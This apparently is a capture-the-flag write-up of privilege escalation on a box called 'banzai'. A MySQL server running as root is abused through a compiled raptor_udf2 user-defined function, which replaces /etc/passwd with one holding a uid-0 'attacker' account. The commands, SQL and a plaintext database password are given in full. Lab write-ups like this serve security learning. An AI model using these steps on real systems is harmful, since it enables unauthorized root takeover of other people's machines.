# Priv Esc

mysql running as root

```text
www-data@banzai /var/www/html$ ps aux | grep mysql
root       735  0.0  8.5 1122720 175744 ?      Sl   01:22   0:00 /usr/sbin/mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid
www-data  1497  0.0  0.0  11108   948 pts/0    S+   01:33   0:00 grep mysql
```

gcc exists for compilation

```text
www-data@banzai /var/www/html$ gcc
gcc: fatal error: no input files
compilation terminated.
```

Download [this](https://github.com/1N3/PrivEsc/blob/master/mysql/raptor_udf2.c) to compile on target. Note that unlike the readme it's `-Wl` not 1(one)

```text
www-data@banzai /dev/shm$ ls -lah
total 8.0K
drwxrwxrwt  2 root     root       80 Jun 13 01:36 .
drwxr-xr-x 16 root     root     3.0K Aug 12  2020 ..
-rw-------  1 postgres postgres 2.3K Aug 12  2020 PostgreSQL.628815478
-rw-r--r--  1 www-data www-data 3.3K Jun 13 01:34 raptor_udf2.c
www-data@banzai /dev/shm$ gcc -g -c raptor_udf2.c
www-data@banzai /dev/shm$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
www-data@banzai /dev/shm$ ls -lah
total 28K
drwxrwxrwt  2 root     root      120 Jun 13 01:38 .
drwxr-xr-x 16 root     root     3.0K Aug 12  2020 ..
-rw-------  1 postgres postgres 2.3K Aug 12  2020 PostgreSQL.628815478
-rw-r--r--  1 www-data www-data 3.3K Jun 13 01:34 raptor_udf2.c
-rw-r--r--  1 www-data www-data 7.2K Jun 13 01:37 raptor_udf2.o
-rwxr-xr-x  1 www-data www-data  11K Jun 13 01:38 raptor_udf2.so
```

Then we check the plugins dir

```text
www-data@banzai /dev/shm$ mysql -u root -h 127.0.0.1 -pEscalateRaftHubris123
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 4
Server version: 5.7.30 MySQL Community Server (GPL)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> SHOW VARIABLES WHERE Variable_Name LIKE "%dir";
+---------------------------+----------------------------+
| Variable_name             | Value                      |
+---------------------------+----------------------------+
| basedir                   | /usr/                      |
| character_sets_dir        | /usr/share/mysql/charsets/ |
| datadir                   | /var/lib/mysql/            |
| innodb_data_home_dir      |                            |
| innodb_log_group_home_dir | ./                         |
| innodb_tmpdir             |                            |
| lc_messages_dir           | /usr/share/mysql/          |
| plugin_dir                | /usr/lib/mysql/plugin/     |
| slave_load_tmpdir         | /tmp                       |
| tmpdir                    | /tmp                       |
+---------------------------+----------------------------+
10 rows in set (0.00 sec)

mysql> select @@plugin_dir;
+------------------------+
| @@plugin_dir           |
+------------------------+
| /usr/lib/mysql/plugin/ |
+------------------------+
1 row in set (0.00 sec)
```

*Note: If plugin_dir is blank, we can't [set it](https://forums.mysql.com/read.php?10,416210,416211#msg-416211), but somehow using /usr/lib works sometimes.*

That's where we'll save the plugin .so file to with mysql. You should check if such a file already exists so we can just load the function and skip this step. Run this in mysql

```mysql
use mysql;
drop table if exists foo;
create table foo(line blob);
insert into foo values(load_file('/dev/shm/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
mysql> select * from mysql.func;
+-----------+-----+----------------+----------+
| name      | ret | dl             | type     |
+-----------+-----+----------------+----------+
| do_system |   2 | raptor_udf2.so | function |
+-----------+-----+----------------+----------+
1 row in set (0.00 sec)
```

Then we can replace /etc/passwd

```mysql
mysql> select do_system('cp /dev/shm/passwd /etc/passwd');
+---------------------------------------------+
| do_system('cp /dev/shm/passwd /etc/passwd') |
+---------------------------------------------+
|                                           0 |
+---------------------------------------------+
1 row in set (0.01 sec)
```

and switch to root

```text
www-data@banzai /dev/shm$ tail /etc/passwd
Debian-exim:x:105:109::/var/spool/exim4:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
sshd:x:107:65534::/run/sshd:/usr/sbin/nologin
banzai:x:1000:1000:Banzai,,,:/home/banzai:/bin/bash
admin:x:1001:1001::/var/www/html/:
ftp:x:108:113:ftp daemon,,,:/srv/ftp:/bin/false
mysql:x:109:114:MySQL Server,,,:/var/lib/mysql:/bin/false
postfix:x:110:115::/var/spool/postfix:/bin/false
postgres:x:111:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
attacker:$1$WUQKLSZK$Uaj4/NcsbRMZAdbr6xuYz.:0:0:attacker:/root:/bin/bash
www-data@banzai /dev/shm$ su attacker
Password:
root@banzai:/dev/shm# id
uid=0(root) gid=0(root) groups=0(root)
```

